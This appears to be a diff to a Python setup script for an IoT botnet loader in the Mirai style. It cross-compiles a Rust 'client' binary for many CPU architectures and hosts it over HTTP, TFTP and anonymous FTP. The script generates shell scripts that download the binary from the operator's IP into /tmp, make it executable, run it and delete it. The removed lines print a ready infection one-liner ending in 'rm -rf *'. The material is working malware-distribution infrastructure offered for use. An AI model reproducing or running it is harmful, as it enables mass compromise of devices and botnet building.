@@ -13,14 +13,14 @@ ip = sys.argv[2]
 
 download_archs = input("Download architectures? Y/n: ").lower() == "y"
 
-# Define Rust target architectures and corresponding binary names
+# Define Rust target architectures
 rust_archs = [
-    ("aarch64-unknown-linux-gnu", "binary_aarch64"),
-    ("arm-unknown-linux-gnueabihf", "binary_armv7"),
-    ("mips-unknown-linux-gnu", "binary_mips"),
-    ("mipsel-unknown-linux-gnu", "binary_mipsel"),
-    ("i686-unknown-linux-gnu", "binary_i686"),
-    ("x86_64-unknown-linux-gnu", "binary_x86_64"),
+    "aarch64-unknown-linux-gnu",
+    "arm-unknown-linux-gnueabihf",
+    "mips-unknown-linux-gnu",
+    "mipsel-unknown-linux-gnu",
+    "i686-unknown-linux-gnu",
+    "x86_64-unknown-linux-gnu",
 ]
 
 def run(cmd):
@@ -31,7 +31,7 @@ run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
 
 if download_archs:
     print("Downloading Rust target architectures")
-    for arch, _ in rust_archs:
+    for arch in rust_archs:
         run(f"rustup target add {arch}")
     print("Rust targets downloaded.")
 
@@ -39,8 +39,8 @@ if download_archs:
 os.chdir(rust_project)
 
 # Cross compile for each architecture
-for arch, binary_name in rust_archs:
-    run(f"cargo build --release --target={arch} --bin {binary_name}")
+for arch in rust_archs:
+    run(f"cargo build --release --target={arch} --bin client")
 
 print("Cross compiling done. Setting up servers...")
 
@@ -90,15 +90,16 @@ with open("/etc/vsftpd/vsftpd-anon.conf", "w") as f:
 run("service vsftpd restart")
 
 # Copy binaries to server directories and setup scripts
-for _, binary_name in rust_archs:
-    binary_path = f"./target/{binary_name}/release/{binary_name}"
-    run(f"cp {binary_path} /var/www/html")
-    run(f"cp {binary_path} /var/ftp")
-    run(f"mv {binary_path} /var/lib/tftpboot")
+for arch in rust_archs:
+    binary_name = f"client-{arch}"
+    binary_path = f"./target/{arch}/release/client"
+    run(f"cp {binary_path} /var/www/html/{binary_name}")
+    run(f"cp {binary_path} /var/ftp/{binary_name}")
+    run(f"mv {binary_path} /var/lib/tftpboot/{binary_name}")
 
 # Creating shell scripts for binary execution
 bins_sh = f'''#!/bin/bash
-for binary in {" ".join([name for _, name in rust_archs])}; do
+for binary in {" ".join([f"client-{arch}" for arch in rust_archs])}; do
     echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{ip}/$binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/www/html/bins.sh
     echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp {ip} -c get $binary; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp1.sh
     echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r $binary -g {ip}; chmod +x $binary; ./$binary; rm -rf $binary" >> /var/lib/tftpboot/tftp2.sh
@@ -121,6 +122,3 @@ run("service httpd restart")
 run('echo "ulimit -n 99999" >> ~/.bashrc')
 
 print("\x1b[0;32mSuccessfully cross compiled and set up servers!\x1b[0m")
-print("\x1b[0;32mYour link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
-print
-print("\x1b[0;32mCoded By n00dl3z. Inspired by Void\x1b[0m")
